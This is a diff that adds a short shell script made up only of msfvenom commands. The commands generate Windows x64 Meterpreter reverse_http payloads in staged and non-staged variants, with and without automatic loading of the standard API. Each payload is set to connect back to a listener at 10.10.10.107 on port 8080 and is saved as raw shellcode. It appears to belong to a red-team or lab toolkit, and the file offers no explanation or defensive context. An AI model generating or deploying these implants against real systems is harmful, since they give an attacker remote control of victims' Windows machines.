@@ -1,0 +1,7 @@
+# non-staged
+msfvenom -a x64 -p windows/x64/meterpreter_reverse_http AUTOLOADSTDAPI=FALSE LPORT=8080 LHOST=10.10.10.107 -f raw -o meterpreter-revhttp-nonstaged-noautoload.bin
+msfvenom -a x64 -p windows/x64/meterpreter_reverse_http LPORT=8080 LHOST=10.10.10.107 -f raw -o meterpreter-revhttp-nonstaged-autoload.bin
+
+# staged
+msfvenom -a x64 -p windows/x64/meterpreter/reverse_http LPORT=8080 LHOST=10.10.10.107 -f raw -o meterpreter-revhttp-staged.bin
+msfvenom -a x64 -p windows/x64/meterpreter/reverse_http AUTOLOADSTDAPI=FALSE LPORT=8080 LHOST=10.10.10.107 -f raw -o meterpreter-revhttp-staged-noautoload.bin
